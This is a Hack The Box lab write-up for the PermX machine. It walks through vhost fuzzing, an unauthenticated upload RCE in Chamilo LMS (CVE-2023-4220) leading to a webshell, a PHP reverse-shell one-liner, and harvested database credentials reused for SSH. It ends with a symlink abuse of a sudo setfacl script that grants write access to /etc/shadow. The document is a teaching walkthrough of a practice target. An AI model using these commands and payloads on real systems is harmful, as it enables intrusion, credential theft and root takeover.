# HTB - PermX

#HTB #PermX #Chamilo #CVE-2023-4220 #vhost #setfacl #SymlinkAttack #PasswordReuse #Easy

Target: `permx.htb`

## Services

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA)
|_  256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: eLEARNING
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

![[image-20240711150349307-PermX.png]]

![[image-20240711150055540-PermX.png]]

## Enumeration

Main site is a Themewagon "eLEARNING" template — **no Apache vulns, no Themewagon vulns**. The way in is a vhost.

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/namelist.txt \
     -u http://permx.htb -H "HOST: FUZZ.permx.htb" -fc 302
```

| vhost | Result |
|---|---|
| `www` | Same as the main site |
| `lms` | **Chamilo LMS** — an admin-facing app |

![[image-20240711161058034-PermX.png]]

## Findings

**Chamilo LMS — CVE-2023-4220**, unauthenticated file upload → RCE.

- Exploit: [Rai2en/CVE-2023-4220-Chamilo-LMS](https://github.com/Rai2en/CVE-2023-4220-Chamilo-LMS)

The upload lands in the `bigupload` directory and is directly reachable:

```
http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/webshell.php?cmd=whoami
# -> www-data
```

## Foothold

```bash
php -r '$sock=fsockopen("10.10.14.183",9001);exec("/bin/sh -i <&3 >&3 2>&3");'
```

TTY upgrade:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z to background
stty raw -echo
stty size
fg
reset
export SHELL=bash
export TERM=xterm-256color
stty rows 67 columns 318      # match your local `stty size`
```

## Creds

Chamilo `cli-config.php` / `app/config/configuration.php`:

```php
$_configuration['db_host'] = 'localhost';
$_configuration['db_port'] = '3306';
$_configuration['main_database'] = 'chamilo';
$_configuration['db_user'] = 'chamilo';
$_configuration['db_password'] = '03F6lY3uXAP2bkW8';
$_configuration['db_manager_enabled'] = false;
// Security word for password recovery
$_configuration['security_key'] = '08ecc755d674efaa6b1ab289e6053a9b';
$_configuration['password_encryption'] = 'bcrypt';
```

```bash
mysql -u chamilo -p03F6lY3uXAP2bkW8 -h localhost
```

- `chamilo:03F6lY3uXAP2bkW8` — DB
- **Password reuse → `ssh mtz@permx.htb`** with the same DB password. This is the www-data → user pivot.

## Privesc

```bash
sudo -l
# (root) NOPASSWD: /opt/acl.sh
```

```bash
cat /opt/acl.sh
```

```bash
#!/bin/bash

if [ "$#" -ne 3 ]; then
    /usr/bin/echo "Usage: $0 user perm file"
    exit 1
fi

user="$1"
perm="$2"
target="$3"

if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
    /usr/bin/echo "Access denied."
    exit 1
fi

# Check if the path is a file
if [ ! -f "$target" ]; then
    /usr/bin/echo "Target must be a file."
    exit 1
fi

/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"
```

**The flaw:** the guard blocks `..` traversal and forces the path to start with `/home/mtz/`, but it never resolves symlinks. A symlink inside `/home/mtz/` pointing at `/` satisfies the string check while `setfacl` follows it to any file on the box.

```bash
ln -s / root
sudo /opt/acl.sh mtz rwx /home/mtz/root/etc/shadow
```

That grants `mtz` read/write on `/etc/shadow`. Copy the `mtz` hash over root's entry, then `su` with the mtz password:

```
$y$j9T$RUjBgvOODKC9hyu5u7zCt0$Vf7nqZ4umh3s1N69EeoQ4N5zoid6c2SlGb1LvBFRxSB
```

### linpeas — exploit suggester (all "less probable", not needed)

```
[+] [CVE-2022-0847] DirtyPipe           ubuntu=(20.04|21.04), debian=11
[+] [CVE-2021-4034] PwnKit              ubuntu=10..21, debian=7..11, fedora, manjaro
[+] [CVE-2021-3156] sudo Baron Samedit   mint=19, ubuntu=18|20, debian=10
[+] [CVE-2021-3156] sudo Baron Samedit 2 centos=6|7|8, ubuntu=14..20, debian=9|10
[+] [CVE-2021-22555] Netfilter OOB write ubuntu=20.04 {kernel:5.8.0-*}
[+] [CVE-2017-5618] setuid screen 4.5.0 LPE
```

Other linpeas observations:

```
-rw------- 1 mtz mtz 0 Jan 20 18:10 /home/mtz/.ssh/authorized_keys

Backup Manager / database.php files (www-data owned, Chamilo plugins):
/var/www/chamilo/main/extra/database.php
/var/www/chamilo/plugin/buycourses/database.php      ('password' => '')
/var/www/chamilo/plugin/customcertificate/database.php
/var/www/chamilo/plugin/notebookteacher/database.php
/var/www/chamilo/plugin/sepe/database.php
```

## Users

Harvested from the site/LMS:

| User | Role |
|---|---|
| Davis Miller | admin@permx.htb |
| Noah | Programmer |
| Elsie | Programmer |
| Ralph | Graphic designer |
| Mia | Educator |
| Emma | — |
| Sarah | — |
| Johny | — |
| James | — |

System account reached: `mtz`
